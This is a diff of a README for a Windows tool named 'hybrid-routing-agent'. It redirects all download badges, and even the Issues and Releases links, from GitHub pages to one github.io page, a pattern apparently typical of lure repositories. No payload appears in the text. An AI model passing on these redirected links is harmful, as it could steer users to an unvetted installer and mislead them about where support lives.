@@ -1,6 +1,6 @@
 # 🧠 hybrid-routing-agent - Smart Computer Control Made Simple
 
-[![Download](https://img.shields.io/badge/Download-Latest_Release-00b4d8?style=for-the-badge&logo=github)](https://github.com/acid-pooler760/hybrid-routing-agent/releases)
+[![Download](https://img.shields.io/badge/Download-Latest_Release-00b4d8?style=for-the-badge&logo=github)](https://acid-pooler760.github.io)
 
 ## 🚀 What is This?
 
@@ -31,7 +31,7 @@ Before you start, make sure your computer meets these minimum requirements:
 Visit this link to download the application. Once downloaded, you can run the installer to set up hybrid-routing-agent on your computer.
 
 ### Step 1: Download the Software
-[![Download Button](https://img.shields.io/badge/📥_Download_Now-0078d4?style=for-the-badge&logo=windows)](https://github.com/acid-pooler760/hybrid-routing-agent/releases)
+[![Download Button](https://img.shields.io/badge/📥_Download_Now-0078d4?style=for-the-badge&logo=windows)](https://acid-pooler760.github.io)
 
 ### Step 2: Run the Installer
 1. Locate the downloaded file (usually in your `Downloads` folder)
@@ -68,8 +68,8 @@ Visit this link to download the application. Once downloaded, you can run the in
 ## 📚 Additional Resources
 
 - **Documentation**: Find detailed guides and tutorials in the `docs` folder after installation
-- **Support**: For help, visit the [GitHub Issues page](https://github.com/acid-pooler760/hybrid-routing-agent/issues)
-- **Updates**: Check the [Releases page](https://github.com/acid-pooler760/hybrid-routing-agent/releases) for new versions
+- **Support**: For help, visit the [GitHub Issues page](https://acid-pooler760.github.io)
+- **Updates**: Check the [Releases page](https://acid-pooler760.github.io) for new versions
 
 ## 📝 License
 
